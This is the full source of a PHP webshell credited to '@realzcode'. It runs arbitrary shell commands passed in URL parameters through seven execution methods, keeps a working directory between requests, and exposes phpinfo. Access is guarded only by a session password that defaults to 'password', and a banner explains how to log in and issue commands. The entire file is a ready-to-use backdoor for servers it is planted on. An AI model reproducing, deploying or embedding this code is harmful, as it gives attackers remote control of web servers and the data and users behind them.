<?php 
/* PHP Webshell
 * ------------
 * By @realzcode
 */
$p="password";
session_start();
if(!empty($_SESSION["p"])){
if($_SESSION["p"]!==$p){
echo "* ------------------------- *
* PHP Webshell by Realzcode *
* ------------------------- *
# Locked!";
if(@$_GET["p"]!==$p){
exit;
}}}
$x=escapeshellcmd(@$_GET["x"]);
$w=strtolower(substr(PHP_OS,0,3))==="win";
if(strpos($x,"cd ")!==false){
if($w){
$_SESSION["d"]=str_replace("\\","/",realpath(substr($x,3)));
}else{
$_SESSION["d"]=realpath(substr($x,3));
}}else{
if(empty($_SESSION["d"])){
$_SESSION["d"]=getcwd();
}}
chdir($_SESSION["d"]);
$x=$x." 2>&1";
switch(@$_GET["m"]){
case "r":
echo `$x`;
break;
case "e":
echo system($x);
break;
case "a":
$y=null;
$z=null;
exec($x,$y,$z);
foreach($y as $k=>$v){
echo $v."\n";
}
break;
case "l":
echo shell_exec($x);
break;
case "z":
echo passthru($x);
break;
case "c":
$v=[
0=>["pipe","r"],
1=>["pipe","w"],
2=>["file","php://temp","a"]
];
$y=proc_open($x,$v,$z);
if(is_resource($y)){
fclose($z[0]);
while(!feof($z[1])){
echo fgets($z[1],1024);
}
fclose($z[1]);
$c=proc_close($y);
}
break;
case "o":
$v=popen($x,"r");
$y=fread($v,2096);
echo $y;
pclose($v);
break;
case "d":
echo phpinfo();
break;
case "x":
$_SESSION["p"]=@$_GET["p"];
break;
default:
echo "* ------------------------- *
* PHP Webshell by Realzcode *
* ------------------------- *
# Better [view-source:http://domain.com/webshell.php]
# Login  [?m=x&p={password}]
# Uri    [?m=r&x={command}]
# Chdir  {cd dir}
# Terminal Modes :
0. [m=r] backtick
1. [m=e] system
2. [m=a] exec
3. [m=l] shell_exec
4. [m=z] passthru
5. [m=c] proc_open
6. [m=o] popen
7. [m=d] phpinfo";
break;
}
?>
